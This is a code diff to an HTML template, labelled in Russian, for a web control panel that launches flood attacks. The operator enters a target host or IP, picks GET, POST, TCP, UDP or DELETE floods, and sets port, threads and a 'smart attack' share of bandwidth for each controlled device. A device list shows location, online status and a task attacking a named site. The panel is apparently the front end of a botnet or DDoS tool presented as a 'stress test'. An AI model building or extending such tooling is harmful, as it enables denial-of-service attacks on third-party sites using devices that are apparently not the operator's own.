@@ -16,16 +16,20 @@
                 <legend>1. Укажите адрес</legend>
                 <form class="m-2 w-100">
                     <p>Хост
-                        <input name="url" class="ml-url" type="url">
+                        <input onchange="change_host_ip(this)" name="url"
+                               class="ml-url" type="url">
                     </p>
                     <p>Айпи
                         <input type="ip" class="ml-1" minlength="7"
                                maxlength="15"
                                size="15"
                                name="ip"
+                               onchange="change_host_ip(this)"
                                pattern="^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$">
                     </p>
-                    <center><input type="button" value="Проверить"></center>
+                    <center><input id="check" type="button" value="Проверить"
+                                   onclick="check_available_host_ip(this)">
+                    </center>
                 </form>
             </fieldset>
         </div>
@@ -34,27 +38,27 @@
                 <legend>2. Метод</legend>
                 <form class="w-100">
                     <input type="radio" id="contactChoice1" name="method"
-                           value="get" checked/>
+                           value="get" onchange="change_method()" checked/>
                     <label for="contactChoice1" class="mb-1">GET</label>
                     <br>
 
                     <input type="radio" id="contactChoice2" name="method"
-                           value="post"/>
+                           value="post" onchange="change_method()"/>
                     <label for="contactChoice2" class="mb-1">POST</label>
                     <br>
 
                     <input type="radio" id="contactChoice3" name="method"
-                           value="tcp"/>
+                           value="tcp" onchange="change_method()"/>
                     <label for="contactChoice3" class="mb-1">TCP</label>
                     <br>
 
                     <input type="radio" id="contactChoice4" name="method"
-                           value="udp"/>
+                           value="udp" onchange="change_method()"/>
                     <label for="contactChoice4" class="mb-1">UDP</label>
                     <br>
 
                     <input type="radio" id="contactChoice5" name="method"
-                           value="delete"/>
+                           value="delete" onchange="change_method()"/>
                     <label for="contactChoice5">DELETE</label>
                 </form>
             </fieldset>
@@ -63,12 +67,12 @@
             <fieldset class="border-green w-100">
                 <legend>5. Начать</legend>
                 <center><input id="btn-start" class="m-2" type="button"
-                               value="Старт"></center>
+                               value="Старт" onclick="start()"></center>
             </fieldset>
         </div>
     </div>
     <div class="row mt-5">
-        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12" id="base">
             <fieldset class="border-green w-100">
                 <legend>3. Настройки атаки</legend>
                 <div class="row">
@@ -81,12 +85,14 @@
                         <label>TCP/UDP сообщение</label>
                         <br>
                         <input class="text-center" name="msg_tcp_udp"
+                               id="msg_tcp_udp"
                                type="text" value="This is stress test">
                     </div>
                     <div class="col-xs-3 col-sm-3 col-md-2 col-lg-1">
                         <label>Порт</label>
                         <br>
                         <input max="65535" min="0" name="port" type="number"
+                               id="port"
                                value="80">
                     </div>
                     <div class="col-xs-4 col-sm-4 col-md-3 col-lg-2">
@@ -97,16 +103,19 @@
                                value="250">
                     </div>
                     <div class="col-xs-4 col-sm-4 col-md-3 col-lg-2">
-                        <div style="margin-top: 13%;">
-                            <input type="checkbox" id="scales"
-                                   name="smart_attack"/>
-                            <label for="scales">Умная атака</label>
+                        <div style="margin-top: 13%;"
+                             onclick="change_attack_type(1)">
+                            <input type="checkbox" id="scales1"
+                                   name="smart_attack"
+                                   onclick="return false;"/>
+                            <label for="scales1">Умная атака</label>
                         </div>
                     </div>
                 </div>
             </fieldset>
         </div>
-        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+        <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12" id="smart"
+             style="display: none;">
             <fieldset class="border-green w-100">
                 <legend>3. Настройка умной атаки</legend>
                 <div class="row">
@@ -114,7 +123,8 @@
                         <label title="Сколько трафика будет уходить на атаку у подконтрольного устройства">%
                             скорости</label>
                         <br>
-                        <input name="percent" type="number" value="25">
+                        <input onchange="change_percent(this)" name="percent"
+                               type="number" value="25">
                     </div>
                     <div class="col-xs-4 col-sm-6 col-md-5 col-lg-4">
                         <label>TCP/UDP сообщение</label>
@@ -129,10 +139,12 @@
                                value="80">
                     </div>
                     <div class="col-xs-4 col-sm-4 col-md-3 col-lg-2">
-                        <div style="margin-top: 13%;">
-                            <input type="checkbox" id="scales"
-                                   name="smart_attack" checked/>
-                            <label for="scales">Умная атака</label>
+                        <div style="margin-top: 13%;"
+                             onclick="change_attack_type(2)">
+                            <input type="checkbox" id="scales2"
+                                   name="smart_attack" onclick="return false;"
+                                   checked/>
+                            <label for="scales2">Умная атака</label>
                         </div>
                     </div>
                 </div>
@@ -144,10 +156,6 @@
             <fieldset class="border-green w-100">
                 <legend>4. Подконтрольные устройства</legend>
                 <div class="row">
-                    <div class="col-xs-2 col-sm-1 col-md-1 col-lg-1">
-                        <input type="checkbox" id="scales"
-                               name="smart_attack" checked/>
-                    </div>
                     <div class="col-xs-4 col-sm-4 col-md-3 col-lg-2">
                         <input class="border-0" type="text" id="scales"
                                name="mac_address" value="mac adress" disabled/>
@@ -155,14 +163,15 @@
                     <div class="col-xs-2 col-sm-3 col-md-3 col-lg-2">
                         <label>127.23.23.23</label>
                     </div>
-                    <div class="col-xs-2 col-sm-2 col-md-3 col-lg-2">
+                    <div class="col-xs-2 col-sm-2 col-md-3 col-lg-3">
                         <label>Russia, Moscow</label>
                     </div>
                     <div class="col-xs-2 col-sm-2 col-md-2 col-lg-1">
                         <label>В сети</label>
                     </div>
                     <div class="col-xs-2 col-sm-2 col-md-2 col-lg-2 text-end">
-                        <label class="cursor-pointer" onclick="alert('Атака на сайт https://google.com')">Задача</label>
+                        <label class="cursor-pointer"
+                               onclick="alert('Атака на сайт https://google.com')">Задача</label>
                     </div>
                     <hr class="mt-2">
                 </div>
@@ -171,11 +180,24 @@
     </div>
 </div>
 
+<form class="d-none" method="post" id="send_form">
+    <input type="hidden" name="host_">
+    <input type="hidden" name="method_">
+    <input type="hidden" name="timeout_">
+    <input type="hidden" name="msg_tcp_udp_">
+    <input type="hidden" name="port_">
+    <input type="hidden" name="max_thread_">
+    <input type="hidden" name="percent_">
+    <input type="submit">
+</form>
+
 <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"
         integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3"
         crossorigin="anonymous"></script>
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.min.js"
         integrity="sha384-cuYeSxntonz0PPNlHhBs68uyIAVpIIOZZ5JqeqvYYIcEL727kskC66kF92t6Xl2V"
         crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script src="{{ url_for('static', filename='js/script.js') }}"></script>
 </body>
 </html>
